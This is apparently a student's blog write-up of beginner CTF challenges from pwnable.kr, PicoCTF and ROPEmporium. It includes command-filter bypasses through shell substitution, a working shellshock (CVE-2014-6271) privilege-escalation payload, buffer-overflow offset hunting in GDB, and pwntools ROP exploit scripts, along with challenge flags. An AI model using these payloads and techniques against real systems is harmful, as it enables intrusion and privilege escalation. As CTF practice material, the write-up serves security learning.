As my junior year wraps up, I have a bit of time after finals weeks before my summer job(s) roles start, so I did a list of mostly binary-exploitation related CTFs:
- 5 challenges off of [pwnable.kr](pwnable.kr), a wargame "powered/supported by" Georgia Tech in Atlanta and KyungHee University in Seoul.
- 1 challenge from [PicoCTF](https://picoctf.org/), Carnegie Mellon's CTF training platform
- 1+1/2 challenge from [ROPEmporium](https://ropemporium.com/)
## pwnable.kr:CMD1
Here's the source code for this challenge
```C
#include <stdio.h>
#include <string.h>

int filter (char* cmd) {
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}

int main(int argv, char* argv[], char** envp) {
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[])) return 0;
	system( argv[1] );
	return 0;
}
```
It looks like the binary takes the arguments passed to it, runs it through a filter, and runs them through `sh`.

The `putenv` rolls over the `PATH` environment variable, meaning that it's not able to use relative paths. That means we just need to use an absolute to get a command to run. We also can't specify `flag`, so we just need to print out everything in a directory:
```bash
cmd1@pwnable:~$ ./cmd1 "/bin/cat /home/cmd1/*"
```
This prints out everything, and we can find the flag after wading through the garbage spat out by the binary:
```
        r += strstr(cmd, "flag")!=0;                h%r
        r += strstr(cmd, "sh")!=0;                      h1I^HHPTI@Hp@H@H
 HtÐUHS=r += strstr(cmd, "tmp")!=0;
        return r;
}               H8`HHH9s$fDHH
int main(int argc, char* argv[], char** envp){
 H9r    putenv("PATH=/thankyouverymuch");
 []fff.Hif(filter(argv[1])) return 0;HEHEd@HHEEUHH }HuHUh@kHEHH\tHEHHǸHl$Ld$H- L% Ll$system( argv[1] );t1@LLDAHH9uH\Hl$Ld$Ll$ Lt$(L|$0H8UHS Ht(`DHHu[]ÐflagshtmpPAreturn 0;ouverymuch4PxzRx
}                               FJ
j                                 ?;*3$"DoAC
mommy now I get what PATH environment is for :)
```

## pwnable.kr:CMD2
This challenge is similar to `cmd1`, but with a more comprehensive filter, adding `PATH`, `export`, \`,  `=`, and most pertinently `/`. It also removes any environment variables:
```C
#include <stdio.h>
#include <string.h>
  
int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "=")!=0;
    r += strstr(cmd, "PATH")!=0;
    r += strstr(cmd, "export")!=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}
  
extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}
  
int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

Last time, we solved the challenge by using the absolute path for executing binaries, but that won't work because the `/` character is blocked. Because the filter is only applied once, I bet we can use bash shenanigans to create the `/` character. I created a small program to mimic portions of the target environment:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
  
int main() {
    putenv("PATH=/fake_dir");
    system("/bin/sh");
}
```

Messing around a bit, I found out that running:
```bash
$ $(echo pwd)
/home/<home_dir>/ctf/pwnable/cmd
```

Returns the current dir, and we can try to use this to our advantage:
```bash
{13:17}~/ctf/pwnable/cmd ➭ ./cmd2 "$(pwd)"
{13:18}~/ctf/pwnable/cmd ➭
```

Hmm, it looks like `$(pwd)` might have evaluated to `/` before being passed in, triggering the filter. Luckily I remember an offhand comment made by [@legoclones](https://twitter.com/legoclones) that there is a difference between the `'` single tick and `"` double tick quotes in UNIX shells. I tried using single-ticks:
```bash
cmd2@pwnable:~$ ./cmd2 '$(pwd)'
$(pwd)
sh: 1: /home/cmd2: Permission denied
```

Success! Looks like it tried to execute `/home/cmd2` as a binary, which of course failed. We can experiment to see if we can make the `cwd` `/` so we can use it for later:
```bash
cmd2@pwnable:~$ ./cmd2 'cd ..; cd ..; $(echo pwd)'
cd ..; cd ..; $(echo pwd)
/
cmd2@pwnable:~$
```

We can then uses this `$(pwd)` to execute the same attack:
```bash
cmd2@pwnable:~$ ./cmd2 'cd ..; cd ..; $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)*'
.
.
.
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}
int main(int argc, char* argv[], char** envp){                                                                                                                     delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
FuN_w1th_5h3ll_v4riabl3s_haha               
```

The `system` call executed:
1. Change dir to `..`, the parent dir
2. Change dir to `..`, the parent dir
3. Resolved all of the `$(pwd)` in `$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)*` to `/`, to result in `/bin/cat /home/cmd2/*`
## pwnable.kr:lotto
As usual, we get CLI access to a machine with 3 files, `lotto`, `lotto.c`, and `flag`. I pulled down `lotto` and `lotto.c`, and inspected the source code:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
  
unsigned char submit[6];

void play(){
    int i;
    printf("Submit your 6 lotto bytes : ");
    fflush(stdout);
  
    int r;
    r = read(0, submit, 6);

    printf("Lotto Start!\n");
    //sleep(1);
  
    // generate lotto numbers
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd==-1){
        printf("error. tell admin\n");
        exit(-1);
    }
    unsigned char lotto[6];
    if(read(fd, lotto, 6) != 6){
        printf("error2. tell admin\n");
        exit(-1);
    }
    for(i=0; i<6; i++){
        lotto[i] = (lotto[i] % 45) + 1;     // 1 ~ 45
    }
    close(fd);
    // calculate lotto score
    int match = 0, j = 0;
    for(i=0; i<6; i++){
        for(j=0; j<6; j++){
            if(lotto[i] == submit[j]){
                match++;
            }
        }
    }
  
    // win!
    if(match == 6){
        system("/bin/cat flag");
    }
    else{
        printf("bad luck...\n");
    }
  
}
  
void help(){
    printf("- nLotto Rule -\n");
    prntf("nlotto is consisted with 6 random natural numbers less than 46\n");
    printf("your goal is to match lotto numbers as many as you can\n");
    printf("if you win lottery for *1st place*, you will get reward\n");
    printf("for more details, follow the link below\n");
    printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
    printf("mahematical chance to win this game is known to be 1/8145060.\n");
}
  
int main(int argc, char* argv[]){
  
    // menu
    unsigned int menu;
  
    while(1){
  
        printf("- Select Menu -\n");
        printf("1. Play Lotto\n");
        printf("2. Help\n");
        printf("3. Exit\n");
  
        scanf("%d", &menu);
  
        switch(menu){
            case 1:
                play();
                break;
            case 2:
                help();
                break;
            case 3:
                printf("bye\n");
                return 0;
            default:
                printf("invalid menu\n");
                break;
        }
    }
    return 0;
}
```

It looks like the program takes 6 bytes, normalizes them to mod space 46, then checks if it matches 6 random bytes.

It doesn't look like a textbook buffer overflow is possible, so perhaps there is a programming error. Taking a look at the scoring:
```C    
// calculate lotto score
int match = 0, j = 0;
for(i=0; i<6; i++){
	for(j=0; j<6; j++){
		if(lotto[i] == submit[j]){
			match++;
		}
	}
}
// win!
if(match == 6){
	system("/bin/cat flag");
}
```

It looks like there is a nested for-loop that increments a `match` integer for every time a number in the input appears in the actual lotto. However, because of the nested for loop, if a string is passed with all identical characters, and that character is in the lotto bytes, it will increment the variable 6 times! Surprisingly, it worked the first time:
```bash
lotto@pwnable:~$ ./lotto
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : %%%%%%%
Lotto Start!
sorry mom... I FORGOT to check duplicate numbers... :(
- Select Menu -
1. Play Lotto
2. Help
3. Exit
Submit your 6 lotto bytes :   
```
I'm no stats expert but my gut says that there is a 6/46, or ~13% chance this works per execution.

## pwnable.kr:mistake
We are given a C binary, which is surprising because it is incredibly easy to program C without any mistakes.

```C
#include <stdio.h>
#include <fcntl.h>
 
#define PW_LEN 10
#define XORKEY 1
  
void xor(char* s, int len){
    int i;
    for(i=0; i<len; i++){
        s[i] ^= XORKEY;
    }
}
  
int main(int argc, char* argv[]){
    int fd;
    if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
        printf("can't open password %d\n", fd);
        return 0;
    }
  
    printf("do not bruteforce...\n");
    sleep(time(0)%20);
  
    char pw_buf[PW_LEN+1];
    int len;
    if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
        printf("read error\n");
        close(fd);
        return 0;      
    }
  
    char pw_buf2[PW_LEN+1];
    printf("input password : ");
    scanf("%10s", pw_buf2);
  
    // xor your input
    xor(pw_buf2, 10);
  
    if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
        printf("Password OK\n");
        system("/bin/cat flag\n");
    }
    else{
        printf("Wrong Password\n");
    }
  
    close(fd);
    return 0;
}
```

The hint talks about operator precedence, so investigating this line:
```C
int fd;
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)
```
I know that the assignment operator `=` has just about the lowest precedence with left-right associativity, meaning that everything to the right of the operator will be evaluated before it is assigned to the `lvalue`. That means that `open` will be return with no error, assigning `fd` to `0`. Luckily this `fd` is used as the file descriptor for `read`, which means it will instead take input from `STDIN`:
```C
char pw_buf[PW_LEN+1];
int len;
if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
```

Knowing this, we can control before the `pw_buf` and `pw_buf2` buffers. Adding some `printf` statements, we can experiment with what the result of `pw_buf2` would be after the `xor` function:
```C
printf("PW1: %s\n", pw_buf);
printf("PW2: %s\n", pw_buf2);

// xor your input
xor(pw_buf2, 10);
printf("After PW2: %s\n", pw_buf2);
```

```
asdfasdfas
input password: asdfasdfas
PW1: asdfasdfas
PW2: asdfasdfas
After PW2: `reg`reg`r
Wrong Password
```

Feeding the original program the input:
```
mistake@pwnable:~$ ./mistake
do not bruteforce...
asdfasdfas
input password : `reg`reg`re
Password OK
Mommy, the operator priority always confuses me :(
```

## pwnable.kr:shellshock
We are given a C binary that looks like it is vulnerable to a privilege escalation attack, as the `setuid` bit is set.
```C
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```
However, the hint says `Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :)`. Looking up `shellshock bash` brings up a vulnerability called `shellshock` affects bash version through 4.3. Running `bash -- version`, we see that the version on the server is the vulnerable 4.3.48. Scrolling through exploit-db's list of references, I found [this](https://www.redhat.com/en/blog/bash-specially-crafted-environment-variables-code-injection-attack) redhat article. Using the example, I constructed a payload to open a shell using the uid and gid of the shellshock binary owner:
```bash
shellshock@pwnable:~$ env x='() { :;}; /bin/bash' bash -c "./shellshock"
```
This opens a new shell, allowing me to cat out the flag:
```
shellshock@pwnable:~$ cat flag
only if I knew CVE-2014-6271 ten years ago..!!
```

## PicoCTF:Bookmarklet
We get a link to a website that has a textbox with the following javascript:
```js
javascript:(function() {
	var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓ¡ÒÅ¤í";
	var key = "picoctf";
	var decryptedFlag = "";
	for (var i = 0; i < encryptedFlag.length; i++) {
		decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
	}
	alert(decryptedFlag);
})();
```
Turns out, you can run javascript code in bookmarks! We won't bother with that by just copying it into a browser console. It creates an alert that contains the flag: `picoCTF{p@g3_turn3r_0148cb05}`.

## ROPEmporium:ret2win
We are given a simple binary. Loading it into GDB, we can get an idea of the binary using `info functions`:
```GDB
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
gef➤
```

Of note is the `main`, `pwnme`, and `ret2win` functions. We can call these 3 functions to get an idea of what's happening:
```GDB
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:    mov    ecx,0x0
   0x00000000004006a7 <+16>:    mov    edx,0x2
   0x00000000004006ac <+21>:    mov    esi,0x0
   0x00000000004006b1 <+26>:    mov    rdi,rax
   0x00000000004006b4 <+29>:    call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:    mov    edi,0x400808
   0x00000000004006be <+39>:    call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:    mov    edi,0x400820
   0x00000000004006c8 <+49>:    call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:    mov    eax,0x0
   0x00000000004006d2 <+59>:    call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:    mov    edi,0x400828
   0x00000000004006dc <+69>:    call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:    mov    eax,0x0
   0x00000000004006e6 <+79>:    pop    rbp
   0x00000000004006e7 <+80>:    ret
End of assembler dump.
gef➤         
```

It looks like `main` calls `pwnme`, but never `ret2win`.
```GDB
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave
   0x0000000000400755 <+109>:   ret
End of assembler dump.
gef➤    
```
I would bet there's a buffer overflow vulnerability at the `read` call at `pwnme+97`. Loading this binary into Ghidra, my suspicions are confirmed:
```C
void pwnme(void)
{
	unsigned char buf [32];
  
	memset(buf,0,0x20);
	puts(
		"For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
	);
	puts("What could possibly go wrong?");
	puts(
		"You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
	);
	printf("> ");
	read(0,buf,0x38);
	puts("Thank you!");
	return;
}
```
Probably could've saved a minute or two if I had run the binary beforehand.

It looks like we can write whatever we want deep into the stack, meaning we can likely overwrite the return address. But what address should we return to?
```GDB
gef➤  disas ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
End of assembler dump.
gef➤
```
This looks likely, but what is the command that's being run in the `system` call at `ret2in+14`?
```GDB
gef➤  x/s 0x400943
0x400943:       "/bin/cat flag.txt"
gef➤
```
That could work, looks like returning to `ret2win` will effectively run `/bin/cat flag.txt`. We can drop a break point at the `read` call with `b *(pwnme+92)`. We can then use `gef`'s `pattern create` function to figure out the correct offset:
```GDB
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0'
gef➤
```
We can advance instructions until we reach the `ret` instruction, which will pop the top address of the stack, and move it to `rip`, changing what code is being executed next:
```GDB
0x00007fffffffded8│+0x0000: 0x6161616161616166   ← $rsp
0x00007fffffffdee0│+0x0008: 0x6161616161616167
0x00007fffffffdee8│+0x0010: 0x00007ffff7dfb6ca  →  <__libc_start_call_main+122> mov edi, eax
0x00007fffffffdef0│+0x0018: 0x0000000000000000
0x00007fffffffdef8│+0x0020: 0x0000000000400697  →  <main+0> push rbp
0x00007fffffffdf00│+0x0028: 0x0000000100000000
0x00007fffffffdf08│+0x0030: 0x00007fffffffdff8  →  0x00007fffffffe28d  →  "/home/jakemull/ctf/ROPEmporium/ret2win/ret2win"
0x00007fffffffdf10│+0x0038: 0x00007fffffffdff8  →  0x00007fffffffe28d  →  "/home/jakemull/ctf/ROPEmporium/ret2win/ret2win"
--------------------------------------------
     0x400753 <pwnme+107>      nop
     0x400754 <pwnme+108>      leave
 →   0x400755 <pwnme+109>      ret
--------------------------------------------
[!] Cannot disassemble from $PC
gef➤  pattern search $rsp
[+] Searching for '6661616161616161'/'6161616161616166' with period=8
[+] Found at offset 40 (little-endian search) likely
gef➤
```
Given this, let's steal some of my friend DeltaBlueJay's pwntools code from [this](https://deltabluejay.github.io/ninipwn) writeup to create a simple pwntools script:
```python3
from pwn import *
  
binary = './ret2win'
elf = context.binary = ELF(binary, checksec=False)
  
gs = """
b *(ret2win)
"""
  
if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()
```

We need to get the address of `ret2win`:
```GDB
gef➤  info functions
.
.
.
0x0000000000400756  ret2win
.
gef➤
```

Let's put this address into the script with the padding to create a payload:
```python
target_addr = p64(0x0000000000400757)
padding = b"A" * 40
  
payload = padding + target_addr
```

Then, we can do some pipe magic to get the output:
```python
p.recvuntil(b"> ")
p.sendline(payload)
  
p.interactive()
```

The final script is:
```python
from pwn import *
  
binary = './ret2win'
elf = context.binary = ELF(binary, checksec=False)
  
gs = """
b *(ret2win)
"""
  
if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()
target_addr = p64(0x0000000000400757)
padding = b"A" * 40
  
payload = padding + target_addr
  
p.recvuntil(b"> ")
p.sendline(payload)
  
p.interactive()
```

## ret2win:split
We get a raw binary called `split`. It seems pretty similar to `ret2win`, but with the change that we need to pop a string into `rdi`, then call `system` in `usefulFunction`:
```C
void usefulFunction(void)
{
  system("/bin/ls");
  return;
}
```

We can poke through the binary to see if there is a place that we can steal a command from:
```bash
{16:33}~/ctf/ROPEmporium/split ➭ strings split | grep /
/lib64/ld-linux-x86-64.so.2
/bin/ls
/bin/cat flag.txt
{16:35}~/ctf/ROPEmporium/split ➭    
```

We can then use `ropper` to see if there is a gadget we can use to pop an address into `rdi`:
```bash
{16:35}~/ctf/ROPEmporium/split ➭ ropper -f split | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x00000000004006d4: add byte ptr [rax], al; add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret;
0x00000000004006d6: add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret;
0x00000000004007c3: pop rdi; ret;
{16:35}~/ctf/ROPEmporium/split ➭
```


It looks like such a gadget exists at `0x004007c3`. We know that `rdi`?`edi` is the correct register to hold a reference to the command because it is typically the register for the first argument of a function, and we can disassemble `usefulFunction` to prove this:
```GDB
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
End of assembler dump.
gef➤  x/s 0x40084a
0x40084a:       "/bin/ls"
gef➤
```

We also need to find the correct address for the command. We can use `objdump` to find the address of `/bin/cat flag.txt`:
```bash
{16:43}~/ctf/ROPEmporium/split ➭ objdump -s -j .data split

split:     file format elf64-x86-64

Contents of section .data:
 601050 00000000 00000000 00000000 00000000  ................
 601060 2f62696e 2f636174 20666c61 672e7478  /bin/cat flag.tx
 601070 7400                                 t.
{16:44}~/ctf/ROPEmporium/split ➭
```

It looks like the chain of attack should go:
1. Pop 0x000601060 into `rdi` using the gadget at 0x00004007c3. This means `rdi` stores a pointer to `/bin/cat flag.txt`
2. Run `system` at `usefulFunction+9`/0x0040074b to run `system` with argument `/bin/cat flag.txt`.

This is my first foray into using the `rop` functionality of `pwntools`. This is the current state of the attack script:
```python
#!/usr/bin/env python3
from pwn import *
  
binary = './split'
elf = context.binary = ELF(binary, checksec=False)
  
gs = """
b *(pwnme+77)
c
"""
  
if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()
rop = ROP(binary)
rop.call('system', [0x00601060])
print(rop.dump())
rop = rop.chain()
  
address = 0x0040074b
  
padding = b"A" * 40
payload = padding+ rop + p64(address)
  
p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()
```
I would likely have finished this within an hour, but my self imposed time limit lapsed.

## Wrap-up
Finishing these challenges, I've gotten much better with pwntools, particularly interacting with binaries.